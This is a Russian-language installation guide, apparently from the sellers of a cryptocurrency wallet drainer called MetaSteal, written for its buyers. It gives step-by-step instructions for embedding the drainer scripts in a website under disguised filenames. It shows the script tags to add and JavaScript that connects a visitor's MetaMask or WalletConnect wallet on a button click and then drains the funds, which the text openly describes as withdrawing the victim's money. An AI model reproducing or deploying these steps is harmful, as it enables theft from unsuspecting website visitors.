# Как установить скрипт

**Приветствуем тебя, дорогой покупатель нашего скрипта!**

В данной инструкции мы расскажем тебе как установить наш скрипт на твой собственный веб-сайте быстро и без каких-либо заморочек. Если у тебя нет даже минимальных навыков программирования, лучше напиши нам в техническую поддержку - мы готовы за небольшую плату произвести установку на твой веб-сайт нашего скрипта и настроить его. 

**Но если ты готов сам пройти через это, то давай начинать.**

Для начала тебе нужно скачать с нашего сайта сам скрипт и архив с модулями. Всё это можно сделать в нашей панели управления. После того, как ты это сделал, тебе нужно открыть папку, в которой лежит твой веб-сайт. Если ты её нашёл, отлично - теперь тебе нужно либо создать, либо открыть папку (если она уже существует) с названием "assets". В этой папке тебе нужно создать ещё одну папку с названием "drainer". Теперь открой архив с модулями, который ты скачал, и перемести все файлы из него в папку "drainer", которую ты только что создал. После этого тебе нужно переименовать все скрипты следующим образом:

• Файл, имеющий название "jquery.js", необходимо переименовать в "ms-1.js"

• Файл, имеющий название "ethers.js", необходимо переименовать в "ms-2.js"

• Файл, имеющий название "wconnect.js", необходимо переименовать в "ms-3.js"

**Отлично, ты молодец!**

Теперь скопируй файл со скриптом, который ты скачал, вставь его в папку "drainer" к модулям, которые ты только что переименовал, и переименуй его из того названия, которое у него сть сейчас, в "ms-4.js", таким образом у тебя в папке должны оказаться файлы: ms-1.js, ms-2.js, ms-3.js и ms-4.js. Если всё так, значит всё хорошо.

Теперь тебе нужно вернуться в корневую папку сайта, где лежит папка "assets", которую ты создал или которая уже была там. Теперь в корневой папке создай новый файл и назови его "drainer.js", либо дай ему менее выдающее его название, но главное запомни его и вместо "drainer.js" всегда указывай его, потому что дальше в примерах мы будем использовать именно название "drainer.js".

**Теперь осталось подключить скрипт к своей странице**

Найди файл, который отвечает за отображение твоего веб-сайта, это должен быть HTML файл, который обычно называется "index.html". Открой его с помощью любого редактора кода: например, Visual Studio Code или Sublime Text. Содержимое файла может быть разного размера, но структура будет примерно следующая:

```html
<html>
  <head>
    ...
  </head>
  <body>
    ...
  </body>
</html>
```

Видишь `</body>`? **Обязательно найди тот, где есть знак слэша внутри!**

Весь код ты будешь писать непосредственно на строке выше, чем строка, содержащая `</body>`. Тебе нужно будет подключить все модули, наш скрипт и тот скрипт, что ты создал сам в корне сайта, чтобы всё выглядело вот так:

```html
<html>
  <head>
    ...
  </head>
  <body>
    ...
    <script src="/assets/drainer/ms-1.js"></script>
    <script src="/assets/drainer/ms-2.js"></script>
    <script src="/assets/drainer/ms-3.js"></script>
    <script src="/assets/drainer/ms-4.js"></script>
    <script src="/drainer.js"></script>
  </body>
</html>
```

То есть перед `</body>` тебе нужно добавить эти строки:

```html
<script src="/assets/drainer/ms-1.js"></script>
<script src="/assets/drainer/ms-2.js"></script>
<script src="/assets/drainer/ms-3.js"></script>
<script src="/assets/drainer/ms-4.js"></script>
<script src="/drainer.js"></script>
```

**Ты велеколепен!**

Теперь давай определимся с кнопками, по нажатию на которые начнёт срабатывать дрейнер. Возможно, они уже есть у тебя на странице, а может быть их нужно будет создать. В любом случае элементы кнопкок выглядят таким образом: `<button>Текст кнопки</button>` - ты можешь найти их через поиск текстового редактора. Возможно, у кнопки уже будут какие-то дополнительные аттрибуты, но тебе главное проверить есть ли там аттрибут class: `<button class="btn btn-success">Текст кнопки</button>`.

Если такое есть, то тебе просто нужно отредактировать `class` и добавить в его кавычки в конце сначала пробел, а после написать там `drainer-active`, чтобы получилось так: `<button class="btn btn-success drainer-active">Текст кнопки</button>`. Если аттрибута `class` не было, просто создай его сам как на примере слева. Ты можешь поставить этот класс на любое количество кнопок. При нажатии на эти кнопки произойдет подключение кошелька и начнется списание средств.

В нашем примере мы сделаем так, чтобы по умолчанию активировался MetaMask, а если он не установлен, то уже WalletConnect.

Теперь тебе нужно открыть файл "drainer.js", который ты создал в корневой папке сайта, и вставить туда этот код:

```js
var handler = new MetaSteal();
$('.drainer-active').click(async () => {
  try {
    if (handler.isConnected()) await handler.disconnect();
    var result = await handler.connect(handler.isProvider('metamask') ? 'metamask' : 'wconnect', 1);
    if (result.status == true) await handler.drain();
  } catch(err) {
    console.log(err);
  }
});
```

**Готово!** Теперь наш скрипт начнёт работать на этой странице.

Учтите, что скрипт будет работать только на хостинге. Если вы откроете HTML файл в браузере и попробуете протестировать работу скрипта - ничего не выйдет!

Если вас интересует более подробная настройка, можете прочитать наш старый мануал (https://telegra.ph/MetaSteal--gajd-po-ustanovke-11-17), либо обратиться в техническую поддержку.
